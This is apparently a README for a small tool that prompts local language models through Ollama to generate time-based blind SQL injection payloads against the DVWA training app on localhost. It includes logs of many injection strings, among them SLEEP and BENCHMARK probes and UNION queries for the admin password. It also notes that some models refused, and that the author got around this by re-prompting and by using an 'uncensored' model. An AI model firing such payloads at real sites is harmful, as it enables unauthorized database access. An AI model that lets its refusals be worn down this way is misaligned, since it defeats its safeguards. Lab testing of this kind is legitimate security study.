#  LLM powered simple SQLMap tool
Need depedencies
```bash
pip install requests ollama
```

## Notes 
I experimented with different local language models using Ollama. Using Python ollama I pointed the injection point to the exact vulnerable parameter in DVWA. Then using different prompts to have the model ONLY generate a payload, and no other speech, it iteratted through the first generated payload, and if it detected a 5 second sleep, it would stop. Otherwise it would continue until it found a working payload that confirmed the detection.


Here is an example of some of the payloads it is generating.
Columns are: request duration, url, payload (data in POST request)
```bash
python .\main-dvwa-medium.py
0.02 http://localhost/vulnerabilities/sqli_blind/ id=1 OR IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING(@@VERSION,1,1)='5',SLEEP(5),0)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users') > 0&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING_VERSION(),1,1)=5,BENCHMARK(10000000,SHA1('string')),NULL) -- -&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING_VERSION(),1,1)='5',SLEEP(5),NULL)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_NAME = 'users') > 0&Submit=Submit
4.84 http://localhost/vulnerabilities/sqli_blind/ id=1 AND (SELECT SLEEP(5))&Submit=Submit
4.81 http://localhost/vulnerabilities/sqli_blind/ id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)&Submit=Submit
4.91 http://localhost/vulnerabilities/sqli_blind/ id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING(@@VERSION,1,1)='5',SLEEP(5),0)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING(VERSION(),1,1)='5',SLEEP(5),0)&Submit=Submit
4.69 http://localhost/vulnerabilities/sqli_blind/ id=1 AND (SELECT SLEEP(5))&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING(@@VERSION,1,1)='5',SLEEP(5),0)&Submit=Submit
0.01 http://localhost/vulnerabilities/sqli_blind/ id=1 AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)&Submit=Submit
4.87 http://localhost/vulnerabilities/sqli_blind/ id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))A)&Submit=Submit
```

After testing around 10 different popular models, the LLama3.3 (42gb) was the only one that I was able to find that would ONLY give me a payload.  Each model continued to babble and talk to me no matter what verbage I used to ask it.  As a result of it being so large, it ran very slow on my machine.  Additionally many models will not generate a SQL injection payload as they have been trained to not provide offensive tactics.  So that also limited which to models would be useful.

## Results
#### Ollama 3.3 (40b) 
This model seemed to get the best results of giving a payload everytime that worked well. It just "worked", although it being slow.  It was worked reliably.

```bash
0.75 http://localhost/vulnerabilities/sqli/?id=1%27+AND+BENCHMARK%282500000%2C+SHA1%281%29%29+%23&Submit=Submit#
20.34 http://localhost/vulnerabilities/sqli/?id=1%27+OR+IF%28SLEEP%285%29%2C1%2C0%29+%23&Submit=Submit#
[+] SQL Injection Found! http://localhost/vulnerabilities/sqli/?id=1%27+OR+IF%28SLEEP%285%29%2C1%2C0%29+%23&Submit=Submit#
Runtime: 88.30
```

#### Llama 3.2 (3b) 
It was quicker in responding, but would respond: "I can't provide information or guidance on illegal or harmful activities, including SQL injection. Is there something else I can help you with?". After repeated prompts, it would somtimes generate something but the regex fu would be too cumbersome in this model.

#### Dolphin-Mixtral (uncensored) (7b) 
This model has mixed results. Sometimes it's responses are hard to grab and use reliably.  It did have some successes, and it was quicker in generating the payload then llama3.3 to test.  This example found it quickly but many other attempts failed. It did morph the payload a bit, which was good.

```bash
payload: ' OR SLEEP(5)=0 -- -
20.43 http://localhost/vulnerabilities/sqli/?id=1' OR SLEEP(5)=0 -- -&Submit=Submit#
[+] SQL Injection Found! http://localhost/vulnerabilities/sqli/?id=1' OR SLEEP(5)=0 -- -&Submit=Submit#
Runtime: 42.79
```

#### Gemma2 (2b)
Not sure what was happening here, it never really got anything correct. It was discussing aws boto3, some coffee, and it gave me a poem one time...

#### Codellama (7b)
This model has potential. As it seems to be quick enough in generating a new payload but the responses are not consistent. I have a feeling with tweaking the prompt a bit more may get more consistent results.  When asked to only provide the payload, it will generate the payload and attach it to the url which makes the post processing hard.  As sometimes it will and sometimes it won't.  But again this model I would spend some more time with as it could have potential as being a good candidate for this type of job.

```bash
payload: http://localhost/vulnerabilities/sqli/?id=1%20AND%20SLEEP(5)&Submit=Submit#
0.02 http://localhost/vulnerabilities/sqli/?id=1http://localhost/vulnerabilities/sqli/?id=1%20AND%20SLEEP(5)&Submit=Submit#&Submit=Submit#
payload: http://localhost/vulnerabilities/sqli/?id=1%20AND%20SLEEP(5)&Submit=Submit#&Submit=Submit#?
0.01 http://localhost/vulnerabilities/sqli/?id=1http://localhost/vulnerabilities/sqli/?id=1%20AND%20SLEEP(5)&Submit=Submit#&Submit=Submit#?&Submit=Submit#
payload: http://localhost/vulnerabilities/sqli/?id=1 AND (SELECT password FROM users WHERE username = 'admin') #
0.01 http://localhost/vulnerabilities/sqli/?id=1http://localhost/vulnerabilities/sqli/?id=1 AND (SELECT password FROM users WHERE username = 'admin') #&Submit=Submit#
payload: http://localhost/vulnerabilities/sqli/?id=1 AND (SELECT password FROM users WHERE username = 'admin') #&Submit=Submit#
0.01 http://localhost/vulnerabilities/sqli/?id=1http://localhost/vulnerabilities/sqli/?id=1 AND (SELECT password FROM users WHERE username = 'admin') #&Submit=Submit#&Submit=Submit#
payload: http://localhost/vulnerabilities/sqli/?id=1%20AND%20(SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27)%20#%26Submit%3DSubmit%23%26Submit%3DSubmit%23
0.01 http://localhost/vulnerabilities/sqli/?id=1http://localhost/vulnerabilities/sqli/?id=1%20AND%20(SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27)%20#%26Submit%3DSubmit%23%26Submit%3DSubmit%23&Submit=Submit#
payload: http://localhost/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20CONCAT('admin',%27@localhost%27),%20password%20FROM%20users%20WHERE%20username=%27admin%27%23&Submit=Submit#?
0.01 http://localhost/vulnerabilities/sqli/?id=1http://localhost/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20CONCAT('admin',%27@localhost%27),%20password%20FROM%20users%20WHERE%20username=%27admin%27%23&Submit=Submit#?&Submit=Submit#
payload: None
0.01 http://localhost/vulnerabilities/sqli/?id=1None&Submit=Submit#
payload: None
0.01 http://localhost/vulnerabilities/sqli/?id=1None&Submit=Submit#
```
